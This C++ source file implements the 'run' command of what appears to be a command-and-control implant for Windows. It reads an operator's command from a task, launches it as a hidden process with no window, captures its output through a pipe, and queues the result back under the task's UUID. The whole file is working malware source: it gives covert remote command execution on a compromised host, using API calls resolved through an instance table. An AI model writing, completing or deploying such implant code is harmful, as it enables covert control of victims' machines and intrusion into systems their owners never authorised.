#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_RUN

using namespace stardust;
using namespace starburst;

struct RunJobCtx {
    instance* inst;
    char      task_uuid[37];
    HANDLE    h_read;
    HANDLE    h_process;
};

static auto WINAPI declfn run_thread_fn( LPVOID param ) -> DWORD {
    auto ctx  = static_cast<RunJobCtx*>( param );
    auto& inst = *ctx->inst;

    inst.kernel32.WaitForSingleObject( ctx->h_process, 30000 );
    inst.kernel32.TerminateProcess( ctx->h_process, 0 );
    inst.kernel32.CloseHandle( ctx->h_process );

    uint8_t* output = nullptr;
    uint32_t out_len = 0;
    uint32_t out_cap = 0;

    DWORD bytes_read = 0;
    uint8_t read_buf[4096];

    while ( true ) {
        bytes_read = 0;
        BOOL read_ok = inst.kernel32.ReadFile(
            ctx->h_read, read_buf, sizeof(read_buf), &bytes_read, nullptr );
        if ( !read_ok || bytes_read == 0 ) break;

        if ( out_len + bytes_read > out_cap ) {
            uint32_t new_cap = out_cap == 0 ? 4096 : out_cap;
            while ( new_cap < out_len + bytes_read + 1 ) new_cap *= 2;
            output = static_cast<uint8_t*>( inst.heap_realloc( output, new_cap ) );
            out_cap = new_cap;
        }

        memory::copy( output + out_len, read_buf, bytes_read );
        out_len += bytes_read;
    }

    inst.kernel32.CloseHandle( ctx->h_read );

    if ( output ) {
        output[out_len] = '\0';
        queue_response( inst, ctx->task_uuid, RESPONSE_SUCCESS,
            reinterpret_cast<char*>( output ) );
        inst.heap_free( output );
    } else {
        queue_response( inst, ctx->task_uuid, RESPONSE_SUCCESS,
            symbol<char*>( const_cast<char*>( "" ) ) );
    }

    inst.heap_free( ctx );
    return 0;
}

auto declfn starburst::cmd_run(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t cmd_len = 0;
    auto cmd_str = parser_string( params, &cmd_len );
    if ( !cmd_str || cmd_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no command provided" ) ) );
        return;
    }

    char cmdline[1024] = { 0 };
    if ( cmd_len < sizeof(cmdline) - 1 ) {
        memory::copy( cmdline, cmd_str, cmd_len );
        cmdline[cmd_len] = '\0';
    }

    wchar_t wcmdline[1024] = { 0 };
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, cmdline, -1, wcmdline, 1024 );

    SECURITY_ATTRIBUTES sa = {};
    sa.nLength        = sizeof( SECURITY_ATTRIBUTES );
    sa.bInheritHandle = TRUE;

    HANDLE h_read  = nullptr;
    HANDLE h_write = nullptr;

    if ( !inst.kernel32.CreatePipe( &h_read, &h_write, &sa, 0 ) ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "CreatePipe failed" ) ) );
        return;
    }

    STARTUPINFOW si = {};
    si.cb          = sizeof( STARTUPINFOW );
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput  = h_write;
    si.hStdError   = h_write;

    PROCESS_INFORMATION pi = {};

    BOOL ok = inst.kernel32.CreateProcessW(
        nullptr, wcmdline,
        nullptr, nullptr,
        TRUE,
        CREATE_NO_WINDOW,
        nullptr, nullptr,
        &si, &pi
    );

    inst.kernel32.CloseHandle( h_write );

    if ( !ok ) {
        inst.kernel32.CloseHandle( h_read );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "CreateProcessW failed" ) ) );
        return;
    }

    inst.kernel32.CloseHandle( pi.hThread );

    auto ctx = static_cast<RunJobCtx*>( inst.heap_alloc( sizeof(RunJobCtx) ) );
    if ( !ctx ) {
        inst.kernel32.TerminateProcess( pi.hProcess, 0 );
        inst.kernel32.CloseHandle( pi.hProcess );
        inst.kernel32.CloseHandle( h_read );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    ctx->inst      = &inst;
    ctx->h_read    = h_read;
    ctx->h_process = pi.hProcess;
    memory::copy( ctx->task_uuid, task_uuid, 36 );
    ctx->task_uuid[36] = '\0';

    HANDLE h_thread = inst.kernel32.CreateThread(
        nullptr, 0,
        reinterpret_cast<LPTHREAD_START_ROUTINE>( run_thread_fn ),
        ctx, 0, nullptr );

    if ( !h_thread ) {
        inst.kernel32.TerminateProcess( pi.hProcess, 0 );
        inst.kernel32.CloseHandle( pi.hProcess );
        inst.kernel32.CloseHandle( h_read );
        inst.heap_free( ctx );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "CreateThread failed" ) ) );
        return;
    }

    if ( inst.jobs.count < instance::MAX_JOBS ) {
        auto& job = inst.jobs.entries[inst.jobs.count++];
        memory::copy( job.task_uuid, ctx->task_uuid, 37 );
        job.cmd_id   = CMD_RUN;
        job.h_thread = h_thread;
        job.active   = true;
    } else {
        inst.kernel32.CloseHandle( h_thread );
    }
}

#endif
